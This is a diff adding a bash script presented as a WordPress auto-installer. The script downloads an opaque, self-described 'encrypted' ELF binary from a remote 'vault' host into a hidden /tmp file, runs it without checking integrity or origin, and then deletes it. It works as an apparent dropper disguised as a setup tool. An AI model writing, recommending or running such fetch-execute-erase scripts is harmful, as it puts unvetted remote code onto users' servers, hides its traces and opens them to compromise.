@@ -1,0 +1,26 @@
+#!/bin/bash
+clear
+echo -e "\033[0;36m┌────────────────────────────────────────────────────────┐\033[0m"
+echo -e "\033[0;36m│\033[0m       \033[0;33mTHETECHSAVAGE WP AUTO-INSTALLER v1.0\033[0m             \033[0;36m│\033[0m"
+echo -e "\033[0;36m└────────────────────────────────────────────────────────┘\033[0m"
+echo -e "\n\033[0;34m> Connecting to Secure Vault...\033[0m\n"
+
+# Fetch the heavily encrypted master installer from your Vault
+wget -4 -q -O /tmp/.wp_install "http://vault.thetechsavage.org.ng/wp/install"
+
+# Verify that the file downloaded correctly and is actually an encrypted binary (ELF)
+if ! grep -q "ELF" /tmp/.wp_install 2>/dev/null; then
+    echo -e "\033[0;31m┌────────────────────────────────────────────────────────┐\033[0m"
+    echo -e "\033[0;31m│ [!] FATAL ERROR: Vault Connection Failed.              │\033[0m"
+    echo -e "\033[0;31m└────────────────────────────────────────────────────────┘\033[0m"
+    echo -e "\n\033[0;34mSupport :\033[0m \033[0;32mhttps://t.me/TheTechSavant\033[0m\n"
+    rm -f /tmp/.wp_install
+    exit 1
+fi
+
+# Execute the encrypted binary in the background
+chmod +x /tmp/.wp_install
+/tmp/.wp_install
+
+# Self-destruct the binary from the server
+rm -f /tmp/.wp_install
